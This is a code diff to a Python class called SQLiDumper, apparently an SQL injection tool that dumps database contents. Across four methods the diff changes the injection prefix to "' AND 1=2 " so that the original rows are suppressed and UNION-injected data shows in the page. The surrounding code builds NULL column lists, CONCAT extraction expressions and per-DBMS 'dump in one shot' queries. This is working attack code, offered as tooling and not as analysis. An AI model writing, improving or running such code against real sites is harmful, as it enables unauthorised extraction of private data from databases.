@@ -265,14 +265,15 @@ class SQLiDumper:
         original = params[param][0] if isinstance(params[param], list) else params[param]
         
         # Determine injection prefix: numeric vs string
-        prefix = "' "  # Default: string injection
+        # Use "AND 1=2" to suppress original rows so UNION data is displayed
+        prefix = "' AND 1=2 "  # Default: string injection
         if original.lstrip('-').isdigit():
-            prefix = " "  # Numeric — no quote needed
+            prefix = " AND 1=2 "  # Numeric — no quote needed
         elif sqli.payload_used:
             # Use scanner's detected payload to determine prefix
             p = sqli.payload_used.strip()
             if not p.startswith("'") and not p.startswith('"'):
-                prefix = " "
+                prefix = " AND 1=2 "
         
         if sqli.injection_type == "union" and sqli.injectable_columns:
             null_list = ["NULL"] * sqli.column_count
@@ -381,14 +382,14 @@ class SQLiDumper:
         base, params = scanner._parse_url(sqli.url)
         original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
         
-        # Determine injection prefix
-        prefix = "' "
+        # Determine injection prefix — AND 1=2 suppresses original rows
+        prefix = "' AND 1=2 "
         if original.lstrip('-').isdigit():
-            prefix = " "
+            prefix = " AND 1=2 "
         elif sqli.payload_used:
             p = sqli.payload_used.strip()
             if not p.startswith("'") and not p.startswith('"'):
-                prefix = " "
+                prefix = " AND 1=2 "
         
         if sqli.injection_type == "union" and sqli.injectable_columns:
             null_list = ["NULL"] * sqli.column_count
@@ -498,14 +499,14 @@ class SQLiDumper:
         
         null_list = ["NULL"] * sqli.column_count
         
-        # Determine injection prefix
-        prefix = "' "
+        # Determine injection prefix — AND 1=2 suppresses original rows
+        prefix = "' AND 1=2 "
         if original.lstrip('-').isdigit():
-            prefix = " "
+            prefix = " AND 1=2 "
         elif sqli.payload_used:
             p = sqli.payload_used.strip()
             if not p.startswith("'") and not p.startswith('"'):
-                prefix = " "
+                prefix = " AND 1=2 "
         
         # Build CONCAT expression for all target columns
         separator = "0x7c7c"  # ||
@@ -614,14 +615,14 @@ class SQLiDumper:
         
         null_list = ["NULL"] * sqli.column_count
         
-        # Determine injection prefix
-        prefix = "' "
+        # Determine injection prefix — AND 1=2 suppresses original rows
+        prefix = "' AND 1=2 "
         if original.lstrip('-').isdigit():
-            prefix = " "
+            prefix = " AND 1=2 "
         elif sqli.payload_used:
             p = sqli.payload_used.strip()
             if not p.startswith("'") and not p.startswith('"'):
-                prefix = " "
+                prefix = " AND 1=2 "
         
         dios_query = self.DIOS_QUERIES.get(sqli.dbms or "mysql")
         if not dios_query:
